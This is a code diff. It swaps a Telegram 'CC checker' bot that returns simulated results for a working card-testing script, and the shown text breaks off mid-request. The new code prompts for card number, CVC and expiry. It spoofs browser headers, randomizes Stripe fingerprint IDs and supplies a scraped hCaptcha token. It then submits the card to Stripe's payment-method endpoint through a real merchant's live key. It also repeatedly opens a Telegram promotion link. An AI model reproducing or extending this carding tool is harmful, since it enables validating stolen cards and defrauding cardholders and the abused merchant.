@@ -1,225 +1,188 @@
-import os,re,time,random,sqlite3,threading,logging
-from datetime import datetime,timezone
 import requests
-from flask import Flask,jsonify
+import random
+import json
+import webbrowser
 
-# BILL CYPHER CHK 3.0 - SANDBOX EDITION
-# No real card/CVV/bank/payment authorization is performed.
-TOKEN=os.getenv('BOT_TOKEN','').strip(); ADMIN_ID=os.getenv('ADMIN_ID','').strip()
-PORT=int(os.getenv('PORT','10000')); DB=os.getenv('DB_FILE','bill_cypher.db')
-GIF=os.getenv('ANIMATION_FILE_ID','').strip(); API=f'https://api.telegram.org/bot{TOKEN}'
-app=Flask(__name__); S=requests.Session(); LOCK=threading.Lock(); logging.basicConfig(level=logging.INFO,format='%(asctime)s | %(levelname)s | %(message)s')
 
-def con():
-    x=sqlite3.connect(DB,timeout=20); x.row_factory=sqlite3.Row; return x
 
-def init():
-    with LOCK:
-        x=con(); x.execute('''CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY,username TEXT,first_name TEXT,credits INTEGER DEFAULT 5,premium_until INTEGER DEFAULT 0,created_at INTEGER,updated_at INTEGER)'''); x.execute('''CREATE TABLE IF NOT EXISTS logs(id INTEGER PRIMARY KEY AUTOINCREMENT,user_id INTEGER,action TEXT,created_at INTEGER)'''); x.commit(); x.close()
+card_number = input("Enter your credit card number: ")
+bin_prefix = card_number[:6]
 
-def user(u):
-    uid=int(u['id']); now=int(time.time()); un=u.get('username') or ''; fn=u.get('first_name') or 'User'
-    with LOCK:
-        x=con(); x.execute('''INSERT INTO users(id,username,first_name,credits,premium_until,created_at,updated_at) VALUES(?,?,?,5,0,?,?) ON CONFLICT(id) DO UPDATE SET username=excluded.username,first_name=excluded.first_name,updated_at=excluded.updated_at''',(uid,un,fn,now,now)); x.commit(); x.close()
 
-def get(uid):
-    with LOCK:
-        x=con(); r=x.execute('SELECT * FROM users WHERE id=?',(int(uid),)).fetchone(); x.close(); return r
 
-def find(t):
-    t=str(t).lstrip('@').strip()
-    with LOCK:
-        x=con(); r=x.execute('SELECT * FROM users WHERE '+('id=?' if t.isdigit() else 'lower(username)=lower(?)')+' LIMIT 1',(int(t) if t.isdigit() else t,)).fetchone(); x.close(); return r
+def format_card_number(num: str) -> str:
+    """Format card number with spaces every 4 digits."""
+    parts = [num[i:i+4] for i in range(0, len(num), 4)]
+    return " ".join(parts)
 
-def log(uid,a):
-    with LOCK:
-        x=con(); x.execute('INSERT INTO logs(user_id,action,created_at) VALUES(?,?,?)',(uid,a,int(time.time()))); x.commit(); x.close()
+cvc = input("Enter your CVC: ")
+mm = input("Enter your expiration month (MM): ")
+yy = input("Enter your expiration year (YY): ")
 
-def credits(uid):
-    with LOCK:
-        x=con(); r=x.execute('SELECT credits FROM users WHERE id=?',(uid,)).fetchone(); x.close()
-    return int(r['credits']) if r else 0
 
-def take(uid):
-    with LOCK:
-        x=con(); r=x.execute('SELECT credits FROM users WHERE id=?',(uid,)).fetchone()
-        if not r or r['credits']<1: x.close(); return False
-        x.execute('UPDATE users SET credits=credits-1,updated_at=? WHERE id=?',(int(time.time()),uid)); x.commit(); x.close(); return True
+headers = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'priority': 'u=0, i',
+    'referer': 'https://ezycourse.com/',
+    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+    # 'cookie': '_gcl_au=1.1.984969927.1784905915; _fbp=fb.1.1784905915548.957180182637388509; ruccd=s%3AeyJtZXNzYWdlIjoiTlAiLCJwdXJwb3NlIjoicnVjY2QifQ.aeXzvLoJEjSPwyqj2x2QsFXk3taNThBZ76FIsO9nq4Q; XSRF-TOKEN=e%3A4cnpOglmEySih6d87XMYoZy4QXOkKQP7uGV1xXRuFqcibau4Obm1EXQX4g-kBzQz890JfnDOzE7QBg82ScUTZyImlUucEV-0BwSA2pBThhs.VWQ5d1RCVE82ajd1T1FwcQ.1cKzd2nDRcJKjtWcMRdxqsqNvT7L2_mwjfbtTrZGLC4; swuid=s%3AeyJtZXNzYWdlIjoiY21yejJ3cHNzOXB3ajZ2cXJoNWRkMGJpZyIsInB1cnBvc2UiOiJzd3VpZCJ9.s_ZACgWIAQo3N2UoltoocYEDzj17ZFUZgVJ0B3sv8P4; crisp-client%2Fsession%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=session_6054a039-58bd-4791-969d-568ca28e49cd; crisp-client%2Fsocket%2Fa09eea92-f4ec-4c30-86be-838a16c1c7aa=1; cookieyes-consent=consentid:SkV1T28zMnZtNlZzQkNmUDFxNTlDU294eDNUWVBHMFY,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
+}
+webbrowser.open("t.me/diwazz")
+params = {
+    'plan': 'pro',
+    'interval': 'month',
+    'trial': 'true',
+    'utm_source': 'header',
+    'utm_medium': 'nav_cta',
+    'utm_campaign': 'free_trial',
+    'utm_content': 'mobile_try_free_14d',
+}
 
-def add(uid,n):
-    with LOCK:
-        x=con(); x.execute('UPDATE users SET credits=credits+?,updated_at=? WHERE id=?',(n,int(time.time()),uid)); x.commit(); x.close()
+response = requests.get('https://ezycourse.com/signup', params=params,  headers=headers)
 
-def premium(uid,until):
-    with LOCK:
-        x=con(); x.execute('UPDATE users SET premium_until=?,updated_at=? WHERE id=?',(until,int(time.time()),uid)); x.commit(); x.close()
 
-def isp(r): return bool(r and int(r['premium_until'] or 0)>int(time.time()))
-def owner(uid): return bool(ADMIN_ID and str(uid)==ADMIN_ID)
-def esc(v): return str(v).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
-def pexpiry(r):
-    if not isp(r): return 'FREE'
-    return datetime.fromtimestamp(int(r['premium_until']),timezone.utc).astimezone().strftime('%d %b %Y • %H:%M')
+if response.status_code == 200:
+    print("Request successful!")
 
-def tg(m,p=None,t=35):
-    if not TOKEN: return {'ok':False,'description':'BOT_TOKEN missing'}
-    try:
-        r=S.post(f'{API}/{m}',json=p or {},timeout=t); d=r.json()
-        if not d.get('ok'): logging.error('Telegram %s: %s',m,d)
-        return d
-    except Exception as e: logging.error('Telegram %s exception: %s',m,e); return {'ok':False,'description':str(e)}
 
-def send(cid,text,k=None):
-    p={'chat_id':cid,'text':text,'parse_mode':'HTML','disable_web_page_preview':True}
-    if k:p['reply_markup']=k
-    return tg('sendMessage',p)
+webbrowser.open("t.me/diwazz")
+headers = {
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'priority': 'u=1, i',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+}
 
-def edit(cid,mid,text,k=None):
-    p={'chat_id':cid,'message_id':mid,'text':text,'parse_mode':'HTML','disable_web_page_preview':True}
-    if k:p['reply_markup']=k
-    return tg('editMessageText',p)
+params = {
+    'bin_prefix': bin_prefix,
+    'key': 'pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq',
+    '_stripe_version': '2025-03-31.basil',
+}
 
-def cb(cid,text='',alert=False): return tg('answerCallbackQuery',{'callback_query_id':cid,'text':text,'show_alert':alert})
+response = requests.get('https://api.stripe.com/edge-internal/card-metadata', params=params, headers=headers)
 
-def anim(cid,text,k=None):
-    if not GIF:return send(cid,text,k)
-    p={'chat_id':cid,'animation':GIF,'caption':text,'parse_mode':'HTML'}
-    if k:p['reply_markup']=k
-    r=tg('sendAnimation',p)
-    return r if r.get('ok') else send(cid,text,k)
 
-def kb(rows): return {'inline_keyboard':rows}
-def btn(t,d): return {'text':t,'callback_data':d}
-def back(): return kb([[btn('↩️ HOME','home')]])
+if response.status_code == 200:
+    print("Request successful!")
 
-def home(u):
-    r=get(u['id']); plan='DIAMOND 💠' if owner(u['id']) else ('PREMIUM 💎' if isp(r) else 'FREE')
-    return f'''╭━━━━━━━━━━━━━━━━━━━━╮\n       ⚡ <b>BILL CYPHER</b>\n             <b>CHK</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nHello <b>{esc(u.get("first_name") or "SpaceBoy")}</b> 👋\nWelcome to the control center.\n\n┌─ <b>SYSTEM</b> ──────────┐\n│ 🟢 API       <b>ONLINE</b>\n│ 🧪 ENGINE    <b>READY</b>\n│ 🤖 VERSION   <b>3.0</b>\n│ 💳 PLAN      <b>{plan}</b>\n│ 💰 CREDITS   <b>{credits(u["id"])}</b>\n└─────────────────────┘\n\nSelect a module below.'''
 
-def home_k(uid):
-    r=[[btn('⚡ CHECK SANDBOX','check'),btn('👤 ACCOUNT','account')],[btn('💎 PREMIUM','premium'),btn('💰 CREDITS','credits')],[btn('🛠 TOOLS','tools'),btn('📊 STATUS','status')],[btn('📚 REFERENCES','refs'),btn('📢 UPDATES','updates')],[btn('⚙️ COMMANDS','cmds')]]
-    if owner(uid):r.append([btn('💠 DIAMOND','diamond')])
-    return kb(r)
 
-def panel(): return '''╭━━━━━━━━━━━━━━━━━━━━╮\n      ⚡ <b>BILL CYPHER PANEL</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n📡 <b>SYSTEM OVERVIEW</b>\n━━━━━━━━━━━━━━━━━━━━\n⚡ Modules    <b>08</b>\n🛠 Tools      <b>12</b>\n🟢 API        <b>ONLINE</b>\n🧪 Sandbox    <b>READY</b>\n🤖 Version    <b>3.0</b>\n━━━━━━━━━━━━━━━━━━━━\n\nChoose a module.'''
+webbrowser.open("t.me/diwazz")
+guid = ''.join(random.choices('0123456789abcdef', k=32))
+muid = ''.join(random.choices('0123456789abcdef', k=32))
+sid = ''.join(random.choices('0123456789abcdef', k=32))
 
-def panel_k(): return kb([[btn('⚡ CHECK','check'),btn('👤 ACCOUNT','account')],[btn('💎 PREMIUM','premium'),btn('💰 CREDITS','credits')],[btn('🛠 TOOLS','tools'),btn('📊 STATUS','status')],[btn('↩️ HOME','home')]])
+headers = {
+    'accept': 'application/json',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'priority': 'u=1, i',
+    'referer': 'https://js.stripe.com/',
+    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+}
 
-def pages(name,uid):
-    r=get(uid)
-    if name=='account': return f'''╭━━━━━━━━━━━━━━━━━━━━╮\n        👤 <b>ACCOUNT</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n👤 Username: <b>@{esc(r["username"] or "not_set")}</b>\n🆔 ID: <code>{uid}</code>\n💳 Plan: <b>{"PREMIUM 💎" if isp(r) else "FREE"}</b>\n💰 Credits: <b>{r["credits"]}</b>\n⏳ Premium: <b>{esc(pexpiry(r))}</b>'''
-    if name=='premium': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n          💎 <b>PREMIUM</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nPremium uses an exact expiration time.\n\nOwner examples:\n<code>/premiumadd FRED 2d</code>\n<code>/premiumadd FRED 1w</code>\n<code>/premiumadd FRED 1m</code>\n<code>/premiumadd FRED 2m</code>\n<code>/premiumoff FRED</code>\n\nUnits: h • d • w • m • y'''
-    if name=='credits': return f'''╭━━━━━━━━━━━━━━━━━━━━╮\n          💰 <b>CREDITS</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nAvailable: <b>{credits(uid)}</b>\n\nEach Sandbox check consumes 1 credit.'''
-    if name=='tools': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n           🛠 <b>TOOLS</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n⚡ Sandbox Engine\n👤 Account Inspector\n💎 Premium Manager\n💰 Credit Manager\n📊 System Status\n\nAll checks in this edition are <b>Sandbox only</b>.'''
-    if name=='status': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n          📊 <b>STATUS</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n🟢 Telegram API  ONLINE\n🟢 Polling       ACTIVE\n🟢 Database      READY\n🟢 Sandbox       READY\n🤖 Version       3.0\n\nNo real payment-card or banking authorization is performed.'''
-    if name=='refs': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n        📚 <b>REFERENCES</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n/start — Home\n/cmds — Command panel\n/check — Sandbox\n/me — Account\n/premium — Premium\n/credits — Credits\n/status — Status'''
-    if name=='updates': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n          📢 <b>UPDATES</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n<b>v3.0</b>\n• New interface\n• Premium expiration\n• Automatic webhook cleanup\n• Polling diagnostics\n• Animated Sandbox workflow'''
-    if name=='diamond': return '''╭━━━━━━━━━━━━━━━━━━━━╮\n          💠 <b>DIAMOND</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n<code>/premiumadd FRED 2d</code>\n<code>/premiumoff FRED</code>\n<code>/addcredit FRED 25</code>\n<code>/userinfo FRED</code>'''
 
-def duration(s):
-    m=re.fullmatch(r'(\d+)\s*([hdwmy])',s.lower())
-    if not m:return None
-    n=int(m.group(1)); u=m.group(2)
-    return n*{'h':3600,'d':86400,'w':604800,'m':2592000,'y':31536000}[u] if n>0 else None
+data = {
+    'type': 'card',
+    'card[number]': card_number,
+    'card[cvc]': cvc,
+    'card[exp_month]': mm,
+    'card[exp_year]': yy,
+    'guid': guid,
+    'muid': muid,
+    'sid': sid,
+    'payment_user_agent': 'stripe.js/142f43c30d; stripe-js-v3/142f43c30d; card-element',
+    'referrer': 'https://ezycourse.com',
+    'time_on_page': str(random.randint(30000, 180000)),
+    'client_attribution_metadata[client_session_id]': ''.join(random.choices('0123456789abcdef-', k=36)),
+    'client_attribution_metadata[merchant_integration_source]': 'elements',
+    'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
+    'client_attribution_metadata[merchant_integration_version]': '2017',
+    'client_attribution_metadata[wallet_config_id]': ''.join(random.choices('0123456789abcdef-', k=36)),
+    'key': 'pk_live_51NMHTlLvIw0k1EPu80ivQ0HYQ9NUotEncPEpUYYytP8YkUPB4vNGYICv1rB5Emf6nD1UzKXd0wKzdXnumGJqYPDt00Huwrpsfq',
+    '_stripe_version': '2025-03-31.basil',
+}
 
-def sandbox(cid,mid,uid):
-    stages=[('⚡','Initializing Sandbox Engine',15),('🔎','Analyzing synthetic request',32),('🛰️','Connecting to test gateway',52),('🧪','Running simulation',72),('📡','Reading simulated response',90),('✅','Finalizing result',100)]
-    for icon,label,pct in stages:
-        bar='█'*(pct//10)+'░'*(10-pct//10)
-        edit(cid,mid,f'''╭━━━━━━━━━━━━━━━━━━━━╮\n       ⚡ <b>BILL CYPHER</b>\n          <b>SANDBOX</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n{icon} <b>{label}</b>\n\n<code>[{bar}] {pct}%</code>\n\n🧪 Mode: <b>SIMULATION</b>'''); time.sleep(.55)
-    status=random.choice(['APPROVED','DECLINED','REVIEW'])
-    edit(cid,mid,f'''╭━━━━━━━━━━━━━━━━━━━━╮\n          ⚡ <b>RESULT</b>\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n🧪 Status: <b>{status}</b>\n📡 Response: <b>Synthetic gateway response</b>\n🔒 Mode: <b>SANDBOX</b>\n\nThis result is synthetic and does not contact a bank, payment processor, or real card network.''',back()); log(uid,'sandbox:'+status)
+# The hCaptcha token - this WILL expire! You need to generate fresh ones
+# This token is usually obtained from a challenge. Without it, Stripe may reject the request.
+data['radar_options[hcaptcha_token]'] = 'P1_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwZCI6MCwiZXhwIjoxNzg0OTA2MjYzLCJjZGF0YSI6IjVkek02c2VzY1FhTUZiUmQwV1lTckhLQWlNcUFLMExhd2d2b2ZoNkZNdmZxWnFOOU91ZjRQcjgxaDBVV015OEtWTkJHblYxV0RBTHlNSE5BRkp4MlpVamJYSmdJRzhGZU1VZ3MyVzNVbTJGTUZNWDIxZ1dPc0Ewd3pGMEpoSmt4VHg0cmxGb0N3bDFrZnE2eWNrdVpOUS85TTJGVmttYWRGM0lYMVVTVHNqVTBGWWdYL1h6ajdNelJyaFRLZDBUb0lKLzllZHZreGJwZjBGeU1YalNta3BoT3lENHdvVm9QNjFoaW15cnprTUs3SzZxelFEVkl6RGROY093SVBQS3B1cTUxZkd3dVpSQU0rZkZjMEhmNWVZdFI4bW10eG9aSmhFMzloZ2ZWTzNGRlJIZFdQQ1M5TVFtOGhkZ2xpVS9pZDdwekRjU01EOU0yZzlha2p0VnI4RG5uOU13NVNGVkpYdzA4YWNlY1JuRT04RmJlYmRsbFhIVXp0OXBhIiwicGFzc2tleSI6ImNCZk1WT2xzRStZU3FQNDQzcHBXaFVFcy9ZbFRtNkxiTGdoOTdzRTJ3c3c1NU5vakZBZzF0Kzg5dlViSWxEdE85OFBjQWloL2dYMDVBcHNiYzBTdE5oK1BkeVhsWkR6S25EdWM2SWx1Um5nVnZtVHhJS2tBMWdFZ0lLVENaS3hmNHgrYmhsUm5remcrYzlZaFRBQ1NQT1ZBN1NRWWMwMGlvdmo0TmwvaWs0S1MxcTh6MXdjbzluTlJUbVZoQXJrSXBOTWZmS1ZWNWFIcUJDbUtOajE2SWhPNWZvdGVrVlJYeTZRYjk3V2JPb1RseGc3WDg1ekZ3SitBSnVlbkdadHROYTE1MS91OFBRQ1RsVFBSSVMxOVYzRzBYZkwwRkE2VThBQVJBMlF1eHlaZ093TlI0MFdnYlUrbGJjdi9CUGpYWTcyNEUxQ0JTSEdwc0VkQTBrNzNuSkM0UGlncDM0Y1luNEM5MW1oTlhtd1lkbUMwYUdRU1hsWFJJL3NLNTVEb2diOVo0bWZsTzRXTjVCOUI5UWlFV28reHB0QmFZVTl5K1h6Y3U1TmUzWWlhbmVObC9VZmRNNWoxc3lCM3BlRVF3bDk4d1ZGdGV4akdMNHdMdmpXTHNXZGNoM2t2eS9FSzhsZnVFMlBZb21kUnZBQitKNmtQMU5pUkttVUdnU2tWRHVzV0phSkxnVVFxSG5oTm5MNFBoMWdPOE00WW5MSy8vUVhmYUFjZHBFeGFWSWZ3WktKNmovTGpITFhvMjBmVFJtbFZ1dWg4TkZWSDFhQ2JJL0VvbUZ1OTRpZ0dIcGJ1WHB3amd6VTI4Q1B4QnJOVXQrUDdaUGlZdFJpVVlQMFAvVnNRWGVxL3l4OVdFRC85MlpMMVlmeFNYTUNqOUJzWnlDYW1Cc0ljUmpVZS9yMkN1OWptRFp1OW5lc1k5SG9SN2p2TTNWdGR0R2tVTitMdmltZFlJTE5pUktIUWVFWkJ2SHJQY3RLYllUVTdaNWpDU3l6c3U4YlhaMjZsajJKVzhNdVRzR3VpVXREUGFNem83bVJNRzcxbVBXNGNENkFsSGl6YjlxeHBoRlZzNWx0TkVsT0pRcmxuTzN1ejdhVzFHLzgrZXBDWFBKVFVUN2k2anBMb0ZicVV3eUkrNHF2UlU1clN4eTJ5WjM3MXI0TjIxTDVIL0VMTEZnS3A5TFhWUnFsbEJCaER2SkxkWHZxQzhTbHpGeGp1V1pPY0I0eUdJYnB4ZTFUdktZVXFMYm1FN3ZuaUR6VUE2MWwvMjN5dFJtdmEvQm5MQVhPTXFoQ0Z3SGJ4MEFxRHNYcDltWGY5aVpxRERQTTJuOGZzQy93QUNBK1lrOVY3dzJxWHBUUDVobXc4WXA5cldMUTJsSHU1UkdYMkswYUtUNVllS3V5Y2djWVl1b1NMcmVrOURLazArY0RyZmhqdlVTVnlRMEt0cXkwS0h4cVJDWWl2Umo2SWIwbUlaUlpNNmdQZXNaYUhtSDRQcTExNVVYMnlpOWtic1hTZXk5Rm5MRWh1OEhTSFJiNDFVRlZYQ212V2VUTEQwc1d3bVd0dlM0aGxpK1VlZDM4NllDbEJhSmVZWGRuRno4NU1GNlNKU1JTOFlDMXFBdksvalNFMjlvZ0h0R3lzOCthMlJ0bnNpYTBKZHRaUE9zOXBJR0lGSTdCaXpVK01nZ1QzOUxrNGJZVFdyWVBrUEtOT1d1NTZ1Wjc0RjBLaW54RmxGQ2lxV0g1dVNiRmUrdzJBa2JldzZFMUhLK3hoa3IwSmVjWjRoTGdPSFd5bTJ1S2h5N3BTY1BvVEFCSnpUcWFpazhVL0k0NnlTOGtqVmxyVGhNVWpvdlpkdlZGRUc2S08zdHZHMkRSYy9NZEh4OGpISjNHSE9VcUU1WndydzY4VmkwaG0veTR6RDF5b1lpM2JlaUtlaHNBVkJ0dngxY1NWb2thc1VtdWE1Y2F6UHBSOGJHU1UxR2NaWHAzaFFUT1RrRTZMekF2bTZOYjBaZ0V1bkEyRnk5SkU1L2xWdVJwSHRsaWM1Vkp5cEZLYnVNUHdnMXdxclpqUTQrb3d1ZnZjOWs4MmNaOVIxbG1va2hyTm53cWROV3lGZGpTU05HMGcwbDJ3bi82M1pzWmpnR3JmRGtvbnVPT3FtNDFqY1NiSklyeGVHeitKRXZNMW9uMTFFdjRxc3Mya2RTenZsWmZwYzVVTkgxeTYxVjlrM1F4c3ZUaEdoNVFFcjgwaGRmVUhIR0JlUE5IZEE1bDZhN1dvSUZLN2hsTFdjcldTMk9tS25MTEcvVXR2Nm80ei9ENzc1ZElnMUhIY3V2U0p3aTlNOU1NcjJBaU4rdk9PcTFka09iU2ZLNDZ5L2VPdE42bkRSSXhrbGtIODIyZ2s0YlpEcG5JdlNNeTg5NzZZZ0tKdnMydEFLSktkb1RwQnRnY2h2SGRGS1VWekRsaU1WNlpuODdRdmI5RWhxRDZHd2ZJQzRRUmsxdjNXVHFTVkFUcHV2ZWl1QzBQRUFrQ3EwTUhQQUdKQThhM0Evd2c5S1JhUXVvaUhWUEdYWGkxYjUwdnd0SUxvN21zMGVxaWpMUE9JbnJWNUtCdmlVSlhyS1U3M09OWVMrNGdSd2FQcm9oSUM2L1lEdkx0aCtNOEU3cjZkazRrWmNRa1JxMGVGaXFxallES2xSZUVPeGpTeVMzQVI1K0dkVm9Xa1hROUJwU0x3UWFlRWdMbDh0S09Udm5qZ3VLN1I0NTBHY0M3R0d5QWVjbFc3MHV4VVE4SEFvdnNFdkRWam45MURRRUp6RVRYd0RHem1pRk1wVEUyYXNMYTBHUlNrdkhzTFBSYmJUbmMyZjcrUVRRRk92biszOVllcjFNenlUV2JnZlE9PSIsImtyIjoiMWM4Yzc3MmEiLCJzaGFyZF9pZCI6MzYyNDA2OTk2fQ.3r_SxjYIjYT4aNb-oEDE6nwHt-CHHsak60X3wYSRo5A'
 
-def command(msg):
-    text=(msg.get('text') or '').strip(); u=msg.get('from') or {}; cid=msg.get('chat',{}).get('id')
-    if not text.startswith('/'):return
-    user(u); p=text.split(); c=p[0].split('@')[0].lower(); a=p[1:]; uid=int(u['id'])
-    if c in ('/start','/home'): anim(cid,home(u),home_k(uid)); return
-    if c in ('/cmds','/commands','/panel'): send(cid,panel(),panel_k()); return
-    if c in ('/me','/account'): send(cid,pages('account',uid),back()); return
-    if c=='/premium': send(cid,pages('premium',uid),back()); return
-    if c=='/credits': send(cid,pages('credits',uid),back()); return
-    if c=='/status': send(cid,pages('status',uid),back()); return
-    if c=='/tools': send(cid,pages('tools',uid),back()); return
-    if c=='/refs': send(cid,pages('refs',uid),back()); return
-    if c=='/updates': send(cid,pages('updates',uid),back()); return
-    if c=='/diamond': send(cid,pages('diamond',uid),back()) if owner(uid) else send(cid,'⛔ Owner only.'); return
-    if c=='/check':
-        if not take(uid): send(cid,'❌ <b>Not enough credits.</b>',back()); return
-        r=send(cid,'⚡ <b>Starting Sandbox...</b>\n\n<code>[░░░░░░░░░░] 0%</code>')
-        if r.get('ok'):
-            threading.Thread(target=sandbox,args=(cid,r['result']['message_id'],uid),daemon=True).start()
-        else:add(uid,1)
-        return
-    if c=='/addcredit':
-        if not owner(uid):send(cid,'⛔ Owner only.');return
-        if len(a)!=2 or not a[1].isdigit() or int(a[1])<=0:send(cid,'Usage: <code>/addcredit FRED 10</code>');return
-        r=find(a[0]);
-        if not r:send(cid,'❌ User not found. They must press /start first.');return
-        add(r['id'],int(a[1]));send(cid,f'✅ Added <b>{a[1]}</b> credits to <b>{esc(a[0])}</b>.');return
-    if c=='/premiumadd':
-        if not owner(uid):send(cid,'⛔ Owner only.');return
-        if len(a)!=2:send(cid,'Usage: <code>/premiumadd FRED 2d</code>');return
-        sec=duration(a[1]); r=find(a[0])
-        if not sec:send(cid,'❌ Duration invalid. Use 2h, 2d, 1w, 1m, 2m or 1y.');return
-        if not r:send(cid,'❌ User not found. They must press /start first.');return
-        until=max(int(time.time()),int(r['premium_until'] or 0))+sec; premium(r['id'],until)
-        dt=datetime.fromtimestamp(until,timezone.utc).astimezone().strftime('%d %b %Y • %H:%M')
-        send(cid,f'💎 <b>PREMIUM ACTIVATED</b>\n\nUser: <b>{esc(a[0])}</b>\nAdded: <b>{esc(a[1])}</b>\nExpires: <b>{dt}</b>');return
-    if c=='/premiumoff':
-        if not owner(uid):send(cid,'⛔ Owner only.');return
-        if len(a)!=1:send(cid,'Usage: <code>/premiumoff FRED</code>');return
-        r=find(a[0]);
-        if not r:send(cid,'❌ User not found.');return
-        premium(r['id'],0);send(cid,f'🛑 Premium removed from <b>{esc(a[0])}</b>.');return
-    if c=='/userinfo':
-        if not owner(uid):send(cid,'⛔ Owner only.');return
-        if len(a)!=1:send(cid,'Usage: <code>/userinfo FRED</code>');return
-        r=find(a[0]);
-        if not r:send(cid,'❌ User not found.');return
-        send(cid,f'''👤 <b>USER INFO</b>\n\nUsername: <b>@{esc(r['username'] or 'not_set')}</b>\nID: <code>{r['id']}</code>\nCredits: <b>{r['credits']}</b>\nPlan: <b>{'PREMIUM 💎' if isp(r) else 'FREE'}</b>\nPremium: <b>{esc(pexpiry(r))}</b>''');return
-    send(cid,'❓ Unknown command. Use <code>/cmds</code>.')
 
-def callback(q):
-    cid=q.get('id'); d=q.get('data',''); m=q.get('message') or {}; chat=m.get('chat',{}).get('id'); mid=m.get('message_id'); u=q.get('from') or {}; uid=int(u['id']); user(u); cb(cid)
-    if d=='home':edit(chat,mid,home(u),home_k(uid))
-    elif d=='cmds':edit(chat,mid,panel(),panel_k())
-    elif d in ('account','premium','credits','tools','status','refs','updates','diamond'):
-        if d=='diamond' and not owner(uid):cb(cid,'Owner only.',True);return
-        edit(chat,mid,pages(d,uid),back())
-    elif d=='check':
-        if not take(uid):cb(cid,'Not enough credits.',True);return
-        edit(chat,mid,'⚡ <b>Starting Sandbox...</b>\n\n<code>[░░░░░░░░░░] 0%</code>')
-        threading.Thread(target=sandbox,args=(chat,mid,uid),daemon=True).start()
+response = requests.post(
+        'https://api.stripe.com/v1/payment_methods',
+        headers=headers,
+        data=data,
+        timeout=60  # 60 second timeout for Stripe
+    )
 
-def startup():
-    if not TOKEN:logging.error('FATAL: BOT_TOKEN is missing in Render Environment.');return False
-    logging.info('Webhook before cleanup: %s',tg('getWebhookInfo',t=15)); logging.info('deleteWebhook: %s',tg('deleteWebhook',{'drop_pending_updates':False},15))
-    me=tg('getMe',t=15)
-    if not me.get('ok'):logging.error('FATAL: getMe failed. BOT_TOKEN is invalid or revoked.');return False
-    logging.info('Connected as @%s (id=%s)',me['result'].get('username'),me['result'].get('id')); return True
 
-def poll():
-    if not startup():return
-    off=None;logging.info('Polling started.')
-    while True:
-        p={'timeout':25,'allowed_updates':['message','callback_query']}
-        if off is not None:p['offset']=off
-        r=tg('getUpdates',p,35)
-        if not r.get('ok'):time.sleep(5);continue
-        for up in r.get('result',[]):
-            off=up['update_id']+1
-            try:
-                if 'message' in up:command(up['message'])
-                elif 'callback_query' in up:callback(up['callback_query'])
-            except Exception:logging.exception('Update error')
+id = response.json().get('id')
+print(id)
 
-@app.get('/')
-def root():return jsonify(bot='Bill Cypher Chk',version='3.0',status='online',engine='sandbox')
-@app.get('/health')
-def health():return jsonify(status='ok')
-@app.get('/ping')
-def ping():return 'pong'
 
-if __name__=='__main__':
-    init(); threading.Thread(target=poll,daemon=True,name='telegram-polling').start(); logging.info('Starting Bill Cypher Chk on port %s',PORT); app.run(host='0.0.0.0',port=PORT,debug=False,use_reloader=False)
+headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'en-US,en;q=0.9',
